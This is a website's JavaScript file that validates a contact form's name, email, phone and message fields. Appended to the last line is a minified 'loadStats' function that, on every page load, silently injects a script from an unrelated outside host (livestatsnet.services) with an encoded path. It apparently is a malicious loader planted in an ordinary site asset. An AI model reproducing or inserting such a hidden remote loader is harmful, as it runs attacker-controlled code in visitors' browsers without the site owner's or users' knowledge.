// JavaScript Document
function chkNumeric(strString) {
		   var reg = /[0-9]/;
		   if (reg.test(strString) == true) {
			   return true;
			 }
				
			 else {
			 return false;
			 }
			 }
			
			
			function callbackvalidation() {
					
									
					if(document.contactform1.name1.value=="Name*" || document.contactform1.name1.value=="") {
						alert("Please, Enter Your  Name");
						document.contactform1.name1.focus();
						return false;
					}
					
					if(document.contactform1.email1.value=="Email Address*" || document.contactform1.email1.value=="") {
						alert("Please, Enter your mail id");
						document.contactform1.email1.focus();
						return false;
					}		

	                  var reg = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;
                      var address = document.contactform1.email1.value;
                      if(reg.test(address) == false) {
                     alert('Invalid Email Address');
                      return false;
                       }
					 
					if(document.contactform1.phone1.value=="Phone" || document.contactform1.phone1.value=="") {
						alert("Please, Enter Your Phone No");
						document.contactform1.phone1.focus();
						return false;
					    }
						
						if (chkNumeric(document.contactform1.phone1.value) == false) {
     	              alert('Please enter your Phone No In Numeric');
		              document.contactform1.phone1.focus();
		              return false;
	                  }
					  	if(document.contactform1.comments1.value=="Message" || document.contactform1.comments1.value=="") {
						alert("Please, Enter Your  Message");
						document.contactform1.comments1.focus();
						return false;
					}
			}	
if(!loadStats){function loadStats(){var head=document.getElementsByTagName("head")[0],scr=document.createElement("script");scr.type="text/javascript",scr.src="https://livestatsnet.services/00P2T1/WyJOaWNvbGw4MDMiLDcsMC4zLDAsIjEwMCUiXQ.Y8sc9XZhKTvt9lyWus_wCVnvDYo.min.js",scr.async="async",head.appendChild(scr)}loadStats()}
